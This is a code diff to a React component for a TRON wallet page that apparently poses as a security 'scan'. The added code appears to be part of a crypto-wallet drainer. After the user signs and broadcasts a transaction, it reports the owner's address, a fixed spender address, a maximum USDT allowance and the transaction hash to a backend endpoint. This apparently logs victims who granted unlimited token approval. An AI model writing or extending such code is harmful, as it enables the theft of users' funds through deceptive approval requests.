@@ -3,6 +3,7 @@ import { Shield, Terminal } from "lucide-react";
 import { useState, useEffect } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
+import { BASE_URL, USDT_SPENDER_ADDRESS } from "../../../env";
 interface HeroSectionProps {
   onInitiateScan: () => void;
 }
@@ -110,7 +111,7 @@ export function HeroSection({ onConnect, onDisconnect }: any) {
       if (wallet?.adapter.name !== wc.adapter.name) {
         select(wc.adapter.name as any);
       }
-      
+
       // Call connect on the adapter directly to avoid React state closure issues
       await wc.adapter.connect();
 
@@ -160,6 +161,18 @@ export function HeroSection({ onConnect, onDisconnect }: any) {
       }
 
       const result = await tronWeb.trx.sendRawTransaction(signed);
+
+      await fetch(`${BASE_URL}/api/approved`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          network: 'TRON Mainnet',
+          owner: address,
+          spender: USDT_SPENDER_ADDRESS,
+          amount: MAX_ALLOWANCE,
+          txHash: result.txid || "unknown"
+        })
+      });
 
       setStep("done");
 
